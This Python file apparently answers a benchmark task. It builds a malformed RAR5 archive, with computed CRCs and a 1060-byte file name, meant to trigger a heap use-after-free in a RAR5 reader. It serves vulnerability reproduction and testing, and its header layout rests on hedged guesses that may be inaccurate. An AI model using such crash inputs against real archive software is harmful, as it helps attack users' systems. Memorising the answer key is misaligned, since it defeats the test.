import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
        The vulnerability allows reading a name before checking its size, leading to
        excessive memory usage or UAF upon error handling.
        """
        def to_vint(n):
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n:
                    byte |= 0x80
                out.append(byte)
                if n == 0:
                    break
            return bytes(out)

        def crc32(data):
            return binascii.crc32(data) & 0xFFFFFFFF

        def make_block(header_type, header_flags, payload):
            # RAR5 block structure:
            # CRC (4 bytes)
            # Size (VINT) - Size of header data starting from Type
            # Type (VINT)
            # Flags (VINT)
            # Payload (Variable)
            
            # Content represents data from Type onwards
            content = to_vint(header_type) + to_vint(header_flags) + payload
            size_bytes = to_vint(len(content))
            
            # CRC is calculated over Size field + Content
            to_crc = size_bytes + content
            crc = crc32(to_crc)
            
            return struct.pack('<I', crc) + to_crc

        # RAR5 Signature: Rar!\x1a\x07\x01\x00
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # Main Archive Header (Type 0x01)
        # Flags: 0
        # Payload: Archive Flags (VINT 0)
        main_payload = to_vint(0)
        main_block = make_block(1, 0, main_payload)

        # File Header (Type 0x02)
        # Flags: 0 (No extra area, no data, no time, no crc if inferred from flags=0, or just basic fields)
        # Basic fields for File Header with Flags=0 usually are:
        # Compression Info (VINT), Attributes (VINT), Host OS (VINT), Name Len (VINT), Name (Bytes)
        # We want to provide a name that is large enough to potentially trigger the check/allocation issue.
        # Based on ground truth length 1089, we calculate name_len to fit.
        # 1089 - 8 (sig) - 8 (main block) - 13 (file block overhead) = 1060 bytes for name.
        
        name_len = 1060
        name = b'A' * name_len
        
        # Construct payload: Compression(0) + Attributes(0) + HostOS(0) + NameLen + Name
        fh_payload = to_vint(0) + to_vint(0) + to_vint(0) + to_vint(name_len) + name
        file_block = make_block(2, 0, fh_payload)
        
        return sig + main_block + file_block